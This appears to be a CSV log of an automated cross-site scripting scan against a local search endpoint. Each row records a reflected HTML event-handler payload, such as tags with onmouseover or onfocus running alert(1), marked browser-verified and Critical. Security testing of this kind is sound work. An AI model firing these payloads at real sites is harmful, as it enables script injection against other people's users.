Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col ondblclick=""alert(1)"">test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onkeydown=""alert(1)"" contenteditable>test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onkeypress=""alert(1)"" contenteditable>test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onkeyup=""alert(1)"" contenteditable>test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onmousedown=""alert(1)"">test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onmouseenter=""alert(1)"">test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onmouseleave=""alert(1)"">test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onmousemove=""alert(1)"">test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onmouseout=""alert(1)"">test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onmouseover=""alert(1)"">test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onmouseup=""alert(1)"">test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<col onpaste=""alert(1)"" contenteditable>test</col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup draggable=""true"" ondrag=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup draggable=""true"" ondragend=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup draggable=""true"" ondragenter=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup draggable=""true"" ondragleave=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup draggable=""true"" ondragstart=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onbeforecopy=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onbeforecut=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onbeforepaste=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onclick=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup oncut=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup ondblclick=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onkeydown=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onkeypress=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onkeyup=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onmousedown=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onmouseenter=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onmouseleave=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onmousemove=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onmouseout=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onmouseover=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onmouseup=""alert(1)"">test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command draggable=""true"" ondrag=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command draggable=""true"" ondragend=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command draggable=""true"" ondragenter=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command draggable=""true"" ondragleave=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command draggable=""true"" ondragstart=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<command id=x tabindex=1 onactivate=alert(1)></command>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<command id=x tabindex=1 onbeforeactivate=alert(1)></command>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<command id=x tabindex=1 onfocus=alert(1)></command>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<command id=x tabindex=1 onfocusin=alert(1)></command>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onbeforecopy=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onbeforecut=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onbeforepaste=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onclick=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command oncontextmenu=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command oncopy=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command oncut=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command ondblclick=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onkeydown=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onkeypress=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onkeyup=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onmousedown=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onmouseenter=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onmouseleave=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onmousemove=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onmouseout=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onmouseover=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onmouseup=""alert(1)"">test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<command onpaste=""alert(1)"" contenteditable>test</command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content draggable=""true"" ondrag=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content draggable=""true"" ondragend=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content draggable=""true"" ondragenter=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content draggable=""true"" ondragleave=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content draggable=""true"" ondragstart=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<content id=x tabindex=1 onactivate=alert(1)></content>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<content id=x tabindex=1 onbeforeactivate=alert(1)></content>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<content id=x tabindex=1 onfocus=alert(1)></content>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<content id=x tabindex=1 onfocusin=alert(1)></content>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onbeforecopy=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onbeforecut=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onbeforepaste=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<content onblur=alert(1) tabindex=1 id=x></content><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onclick=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content oncontextmenu=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content oncopy=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content oncut=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content ondblclick=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<content onfocusout=alert(1) tabindex=1 id=x></content><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onkeydown=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onkeypress=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onkeyup=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onmousedown=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onmouseenter=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onmouseleave=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onmousemove=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onmouseout=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onmouseover=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onmouseup=""alert(1)"">test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<content onpaste=""alert(1)"" contenteditable>test</content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data draggable=""true"" ondrag=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data draggable=""true"" ondragend=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data draggable=""true"" ondragleave=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<data id=x tabindex=1 onactivate=alert(1)></data>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<data id=x tabindex=1 onbeforeactivate=alert(1)></data>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<data id=x tabindex=1 onbeforedeactivate=alert(1)></data><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<data id=x tabindex=1 onfocus=alert(1)></data>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<data id=x tabindex=1 onfocusin=alert(1)></data>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onbeforecopy=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onbeforecut=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onbeforepaste=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onclick=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data oncontextmenu=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data oncopy=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data oncut=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data ondblclick=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onkeydown=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onkeypress=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onkeyup=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onmousedown=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onmouseenter=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onmouseleave=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onmousemove=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onmouseout=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onmouseover=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onmouseup=""alert(1)"">test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<data onpaste=""alert(1)"" contenteditable>test</data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist draggable=""true"" ondrag=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist draggable=""true"" ondragenter=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist draggable=""true"" ondragleave=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist draggable=""true"" ondragstart=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<datalist id=x tabindex=1 onactivate=alert(1)></datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onbeforecut=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onbeforepaste=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<datalist onblur=alert(1) tabindex=1 id=x></datalist><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onclick=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist oncontextmenu=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist oncopy=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist oncut=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist ondblclick=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onkeydown=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onkeyup=""alert(1)"" contenteditable>test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onmousedown=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onmouseenter=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onmouseleave=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onmousemove=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onmouseout=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onmouseover=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<datalist onmouseup=""alert(1)"">test</datalist>",RAW_REFLECTION,Yes,alert,Critical
